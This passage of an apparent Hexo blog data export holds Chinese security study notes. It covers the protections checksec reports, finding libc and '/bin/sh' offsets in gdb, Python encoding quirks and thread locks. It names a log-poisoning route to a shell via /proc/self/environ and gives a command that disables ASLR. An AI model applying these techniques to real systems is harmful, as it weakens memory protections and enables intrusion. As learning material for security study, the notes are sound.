读取环境变量</p>\n<p>该文件会保存http请求头，所以发送恶意User-aget,可以通过文件包含，包含该文件getshell</p>\n</li>\n<li><p>/proc/net/arp                     读取arp</p>\n<p>判断当前局域网存活的主机</p>\n</li>\n<li><p>/proc/self[pid]/cmdline              获得当前运行程序命令行参数</p>\n</li>\n</ol>\n"},{"title":"pwn备忘录","date":"2018-05-09T12:55:11.000Z","_content":"\n## checksec检测到的保护机制\n\n1. cannary  (栈保护)\n\n   栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 \n\n   gcc选项: \n\n   * gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 \n   * -fno-stack-protector 不开启栈保护 \n\n   > gcc -fno-stack-protector -o test test.c  //禁用栈保护 \n   >\n   > gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 \n   >\n   > gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 \n\n2. fortify\n\n   它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。\n\n3. NX(windows下叫 DEP)\n\n   NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 \n\n   gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 \n\n4. PIE(windows下ASLR)（address space layout randomization）\n\n   一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 \n\n   > 0 - 表示关闭进程地址空间随机化。 \n   >\n   > 1 - 表示将mmap的基址，stack和vdso页面随机化。 \n   >\n   > 2 - 表示在1的基础上增加栈（heap）的随机化。 \n\n   可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。\n\n   Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。\n\n   liunx下关闭PIE的命令如下：\n\n   > sudo -s echo 0 > /proc/sys/kernel/randomize_va_space \n\n5. RELPO\n\n   设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 \n\n## gdb中print和x的区别\n\nprint 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:\n\n> p/x *$rax                                     ; \\$1=0x41414141 \n>\n> x/x $rax                                       ;\\$2=0x41\n\n差不多，区别在于打印出来的字节多少而已。\n\n","source":"_posts/pwn备忘录.md","raw":"---\ntitle: pwn备忘录\ndate: 2018-05-09 20:55:11\ntags: pwn\n---\n\n## checksec检测到的保护机制\n\n1. cannary  (栈保护)\n\n   栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 \n\n   gcc选项: \n\n   * gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 \n   * -fno-stack-protector 不开启栈保护 \n\n   > gcc -fno-stack-protector -o test test.c  //禁用栈保护 \n   >\n   > gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 \n   >\n   > gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 \n\n2. fortify\n\n   它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。\n\n3. NX(windows下叫 DEP)\n\n   NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 \n\n   gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 \n\n4. PIE(windows下ASLR)（address space layout randomization）\n\n   一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 \n\n   > 0 - 表示关闭进程地址空间随机化。 \n   >\n   > 1 - 表示将mmap的基址，stack和vdso页面随机化。 \n   >\n   > 2 - 表示在1的基础上增加栈（heap）的随机化。 \n\n   可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。\n\n   Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。\n\n   liunx下关闭PIE的命令如下：\n\n   > sudo -s echo 0 > /proc/sys/kernel/randomize_va_space \n\n5. RELPO\n\n   设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 \n\n## gdb中print和x的区别\n\nprint 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:\n\n> p/x *$rax                                     ; \\$1=0x41414141 \n>\n> x/x $rax                                       ;\\$2=0x41\n\n差不多，区别在于打印出来的字节多少而已。\n\n","slug":"pwn备忘录","published":1,"updated":"2018-08-02T08:29:41.231Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hv0013qkdlthukp1u6","content":"<h2 id=\"checksec检测到的保护机制\"><a href=\"#checksec检测到的保护机制\" class=\"headerlink\" title=\"checksec检测到的保护机制\"></a>checksec检测到的保护机制</h2><ol>\n<li><p>cannary  (栈保护)</p>\n<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 </p>\n<p>gcc选项: </p>\n<ul>\n<li>gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 </li>\n<li>-fno-stack-protector 不开启栈保护 </li>\n</ul>\n<blockquote>\n<p>gcc -fno-stack-protector -o test test.c  //禁用栈保护 </p>\n<p>gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 </p>\n<p>gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 </p>\n</blockquote>\n</li>\n<li><p>fortify</p>\n<p>它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>\n</li>\n<li><p>NX(windows下叫 DEP)</p>\n<p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 </p>\n<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 </p>\n</li>\n<li><p>PIE(windows下ASLR)（address space layout randomization）</p>\n<p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 </p>\n<blockquote>\n<p>0 - 表示关闭进程地址空间随机化。 </p>\n<p>1 - 表示将mmap的基址，stack和vdso页面随机化。 </p>\n<p>2 - 表示在1的基础上增加栈（heap）的随机化。 </p>\n</blockquote>\n<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>\n<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>\n<p>liunx下关闭PIE的命令如下：</p>\n<blockquote>\n<p>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space </p>\n</blockquote>\n</li>\n<li><p>RELPO</p>\n<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 </p>\n</li>\n</ol>\n<h2 id=\"gdb中print和x的区别\"><a href=\"#gdb中print和x的区别\" class=\"headerlink\" title=\"gdb中print和x的区别\"></a>gdb中print和x的区别</h2><p>print 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:</p>\n<blockquote>\n<p>p/x *$rax                                     ; \\$1=0x41414141 </p>\n<p>x/x $rax                                       ;\\$2=0x41</p>\n</blockquote>\n<p>差不多，区别在于打印出来的字节多少而已。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"checksec检测到的保护机制\"><a href=\"#checksec检测到的保护机制\" class=\"headerlink\" title=\"checksec检测到的保护机制\"></a>checksec检测到的保护机制</h2><ol>\n<li><p>cannary  (栈保护)</p>\n<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 </p>\n<p>gcc选项: </p>\n<ul>\n<li>gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 </li>\n<li>-fno-stack-protector 不开启栈保护 </li>\n</ul>\n<blockquote>\n<p>gcc -fno-stack-protector -o test test.c  //禁用栈保护 </p>\n<p>gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 </p>\n<p>gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 </p>\n</blockquote>\n</li>\n<li><p>fortify</p>\n<p>它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>\n</li>\n<li><p>NX(windows下叫 DEP)</p>\n<p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 </p>\n<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 </p>\n</li>\n<li><p>PIE(windows下ASLR)（address space layout randomization）</p>\n<p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 </p>\n<blockquote>\n<p>0 - 表示关闭进程地址空间随机化。 </p>\n<p>1 - 表示将mmap的基址，stack和vdso页面随机化。 </p>\n<p>2 - 表示在1的基础上增加栈（heap）的随机化。 </p>\n</blockquote>\n<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>\n<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>\n<p>liunx下关闭PIE的命令如下：</p>\n<blockquote>\n<p>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space </p>\n</blockquote>\n</li>\n<li><p>RELPO</p>\n<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 </p>\n</li>\n</ol>\n<h2 id=\"gdb中print和x的区别\"><a href=\"#gdb中print和x的区别\" class=\"headerlink\" title=\"gdb中print和x的区别\"></a>gdb中print和x的区别</h2><p>print 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:</p>\n<blockquote>\n<p>p/x *$rax                                     ; \\$1=0x41414141 </p>\n<p>x/x $rax                                       ;\\$2=0x41</p>\n</blockquote>\n<p>差不多，区别在于打印出来的字节多少而已。</p>\n"},{"title":"python3和python2 base64的问题","date":"2018-03-26T09:12:56.000Z","_content":"首先我们来看两段代码：\n\npython2.7:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint base64.b64encode(text1)\n</pre>\n<pre>\n结果:\nfYN9fm93\n</pre>\n\npython3.5:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += (chr(ord(i) +10))\nprint(base64.b64encode(str.encode(text1)))\n</pre>\n<pre>\n结果:\nb'fcKDfX5vdw=='\n</pre>\n\n我们可以发现，两次base64的结果并不相同。\n\n原因:\n\n我们可以将text1打印出来:\n\npython2.7:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint text1\n</pre>\n\n<pre>\n结果:\n}儅~ow\n</pre>\n\npython3.5:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint(str.encode(text1))\n</pre>\n\n<pre>\n结果:\nb'}\\xc2\\x83}~ow'\n</pre>\n\n在经过\n```\nchr(ord(i) +10)\n```\n操作之后，text1的ascii码变为:\n\n```\n125,131,125,126,111,109\n```\n对应16进制\n\n```\n\\x7d,\\x83,\\x7d,\\x7e,\\x6f,\\x6d\n```\n我们可以发现，在python3.5的情况下，\\x83变成了 \\xc2\\x83，这是因为str.encode默认采用utf-8编码来解码text1。\n\n解决方法:\n在python3.5下，我们可以使用bytesarray\n<pre>\ntext = 'system'\ntext1 =  bytearray()\nfor i in text:\n    text1.append(ord(i) + 10)\nprint(text1)\nprint(base64.b64encode(text1))\n</pre>\n<pre>\n结果:\nbytearray(b'}\\x83}~ow')\nb'fYN9fm93'\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/python3和python2-base64的问题.md","raw":"---\ntitle: python3和python2 base64的问题\ndate: 2018-03-26 17:12:56\ntags:\n- python\n---\n首先我们来看两段代码：\n\npython2.7:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint base64.b64encode(text1)\n</pre>\n<pre>\n结果:\nfYN9fm93\n</pre>\n\npython3.5:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += (chr(ord(i) +10))\nprint(base64.b64encode(str.encode(text1)))\n</pre>\n<pre>\n结果:\nb'fcKDfX5vdw=='\n</pre>\n\n我们可以发现，两次base64的结果并不相同。\n\n原因:\n\n我们可以将text1打印出来:\n\npython2.7:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint text1\n</pre>\n\n<pre>\n结果:\n}儅~ow\n</pre>\n\npython3.5:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint(str.encode(text1))\n</pre>\n\n<pre>\n结果:\nb'}\\xc2\\x83}~ow'\n</pre>\n\n在经过\n```\nchr(ord(i) +10)\n```\n操作之后，text1的ascii码变为:\n\n```\n125,131,125,126,111,109\n```\n对应16进制\n\n```\n\\x7d,\\x83,\\x7d,\\x7e,\\x6f,\\x6d\n```\n我们可以发现，在python3.5的情况下，\\x83变成了 \\xc2\\x83，这是因为str.encode默认采用utf-8编码来解码text1。\n\n解决方法:\n在python3.5下，我们可以使用bytesarray\n<pre>\ntext = 'system'\ntext1 =  bytearray()\nfor i in text:\n    text1.append(ord(i) + 10)\nprint(text1)\nprint(base64.b64encode(text1))\n</pre>\n<pre>\n结果:\nbytearray(b'}\\x83}~ow')\nb'fYN9fm93'\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"python3和python2-base64的问题","published":1,"updated":"2018-03-28T08:55:14.804Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hx0015qkdlkvxn91kk","content":"<p>首先我们来看两段代码：</p>\n<p>python2.7:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint base64.b64encode(text1)\n</pre>\n<pre>\n结果:\nfYN9fm93\n</pre>\n\n<p>python3.5:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += (chr(ord(i) +10))\nprint(base64.b64encode(str.encode(text1)))\n</pre>\n<pre>\n结果:\nb'fcKDfX5vdw=='\n</pre>\n\n<p>我们可以发现，两次base64的结果并不相同。</p>\n<p>原因:</p>\n<p>我们可以将text1打印出来:</p>\n<p>python2.7:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint text1\n</pre>\n\n<pre>\n结果:\n}儅~ow\n</pre>\n\n<p>python3.5:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint(str.encode(text1))\n</pre>\n\n<pre>\n结果:\nb'}\\xc2\\x83}~ow'\n</pre>\n\n<p>在经过<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chr(ord(i) +10)</span><br></pre></td></tr></table></figure></p>\n<p>操作之后，text1的ascii码变为:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">125,131,125,126,111,109</span><br></pre></td></tr></table></figure>\n<p>对应16进制</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x7d,\\x83,\\x7d,\\x7e,\\x6f,\\x6d</span><br></pre></td></tr></table></figure>\n<p>我们可以发现，在python3.5的情况下，\\x83变成了 \\xc2\\x83，这是因为str.encode默认采用utf-8编码来解码text1。</p>\n<p>解决方法:<br>在python3.5下，我们可以使用bytesarray</p>\n<pre>\ntext = 'system'\ntext1 =  bytearray()\nfor i in text:\n    text1.append(ord(i) + 10)\nprint(text1)\nprint(base64.b64encode(text1))\n</pre>\n<pre>\n结果:\nbytearray(b'}\\x83}~ow')\nb'fYN9fm93'\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<p>首先我们来看两段代码：</p>\n<p>python2.7:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint base64.b64encode(text1)\n</pre>\n<pre>\n结果:\nfYN9fm93\n</pre>\n\n<p>python3.5:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += (chr(ord(i) +10))\nprint(base64.b64encode(str.encode(text1)))\n</pre>\n<pre>\n结果:\nb'fcKDfX5vdw=='\n</pre>\n\n<p>我们可以发现，两次base64的结果并不相同。</p>\n<p>原因:</p>\n<p>我们可以将text1打印出来:</p>\n<p>python2.7:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint text1\n</pre>\n\n<pre>\n结果:\n}儅~ow\n</pre>\n\n<p>python3.5:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint(str.encode(text1))\n</pre>\n\n<pre>\n结果:\nb'}\\xc2\\x83}~ow'\n</pre>\n\n<p>在经过<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chr(ord(i) +10)</span><br></pre></td></tr></table></figure></p>\n<p>操作之后，text1的ascii码变为:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">125,131,125,126,111,109</span><br></pre></td></tr></table></figure>\n<p>对应16进制</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x7d,\\x83,\\x7d,\\x7e,\\x6f,\\x6d</span><br></pre></td></tr></table></figure>\n<p>我们可以发现，在python3.5的情况下，\\x83变成了 \\xc2\\x83，这是因为str.encode默认采用utf-8编码来解码text1。</p>\n<p>解决方法:<br>在python3.5下，我们可以使用bytesarray</p>\n<pre>\ntext = 'system'\ntext1 =  bytearray()\nfor i in text:\n    text1.append(ord(i) + 10)\nprint(text1)\nprint(base64.b64encode(text1))\n</pre>\n<pre>\n结果:\nbytearray(b'}\\x83}~ow')\nb'fYN9fm93'\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"python多线程和lock和Rlock","date":"2018-06-14T09:02:12.000Z","_content":"\n在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。\n\nRLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。\n\nrlock只能在同一个线程acquire和release\n\nlock可以在不同的线程acquire和release\n\nrlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。","source":"_posts/python多线程和lock和Rlock.md","raw":"---\ntitle: python多线程和lock和Rlock\ndate: 2018-06-14 17:02:12\ntags:\n---\n\n在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。\n\nRLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。\n\nrlock只能在同一个线程acquire和release\n\nlock可以在不同的线程acquire和release\n\nrlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。","slug":"python多线程和lock和Rlock","published":1,"updated":"2018-06-25T12:00:14.772Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hy0017qkdly6wdzjjj","content":"<p>在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。</p>\n<p>RLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。</p>\n<p>rlock只能在同一个线程acquire和release</p>\n<p>lock可以在不同的线程acquire和release</p>\n<p>rlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。</p>\n<p>RLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。</p>\n<p>rlock只能在同一个线程acquire和release</p>\n<p>lock可以在不同的线程acquire和release</p>\n<p>rlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。</p>\n"},{"title":"pwn前置知识","date":"2018-06-08T01:46:21.000Z","_content":"\n## 调用约定\n\n32位和64位程序的区别, 更多的是体现在[调用约定(Calling Convention)](https://en.wikipedia.org/wiki/X86_calling_conventions)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.\n\n本文主要是介绍Linux平台下的漏洞利用, 所以就专注于`System V AMD64 ABI` 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.\n\n```\n$ cat victim.c\nint foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {\n    return a + b + c + d + e + f + g + h;\n}\nint main() {\n    foo(1, 2, 3, 4, 5, 6, 7, 8);\n    return 0;\n}\n$ gcc victim.c -o victim\n$ objdump -d victim | grep \"<main>:\" -A 11\n00000000000006a0 <main>:\n 6a0:   55                      push   rbp\n 6a1:   48 89 e5                mov    rbp,rsp\n 6a4:   6a 08                   push   0x8\n 6a6:   6a 07                   push   0x7\n 6a8:   41 b9 06 00 00 00       mov    r9d,0x6\n 6ae:   41 b8 05 00 00 00       mov    r8d,0x5\n 6b4:   b9 04 00 00 00          mov    ecx,0x4\n 6b9:   ba 03 00 00 00          mov    edx,0x3\n 6be:   be 02 00 00 00          mov    esi,0x2\n 6c3:   bf 01 00 00 00          mov    edi,0x1\n 6c8:   e8 93 ff ff ff          call   660 <foo>\n```\n\n<!--more-->\n\n## 查找libc基地址\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln\n\tlinux-vdso.so.1 (0x00007ffff7ffa000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)\n```\n\n方法二:\n\n首先查找libc中某一函数的偏移，以system为例:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@\n   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE\n  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5\n```\n\n或者使用ida也可以查找函数的偏移。\n\n寻找system的绝对地址：\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ p system\n$1 = {<text variable, no debug info>} 0x5d0 <system@plt>\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \nasdf\nasdf\n\n[Inferior 1 (process 7107) exited normally]\nWarning: not running or target is remote\ngdb-peda$ p system\n$2 = {int (const char *)} 0x7ffff7a33440 <__libc_system>\n```\n\n然后就可以计算libc的基地址:\n\n>  0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000\n\n## 查找\"/bin/sh\"的偏移地址\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6\n0x1b3e9a\n```\n\n方法二:\n\n在ida中查找。\n\n方法三:\n\n在环境变量中查找。\n\n```shell\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x555555554739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (<main>:\tpush   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRDX: 0x7fffffffddf8 --> 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")\nRSI: 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\nRDI: 0x1 \nRBP: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\nRIP: 0x555555554739 (<main>:\tpush   rbp)\nR8 : 0x7ffff7dd0d80 --> 0x0 \nR9 : 0x7ffff7dd0d80 --> 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffdde0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a <shell+16>:\tcall   0x5555555545d0 <system@plt>\n   0x55555555472f <shell+21>:\tmov    edi,0x0\n   0x555555554734 <shell+26>:\tcall   0x5555555545f0 <exit@plt>\n=> 0x555555554739 <main>:\tpush   rbp\n   0x55555555473a <main+1>:\tmov    rbp,rsp\n   0x55555555473d <main+4>:\tsub    rsp,0x120\n   0x555555554744 <main+11>:\tmov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a <main+17>:\tmov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 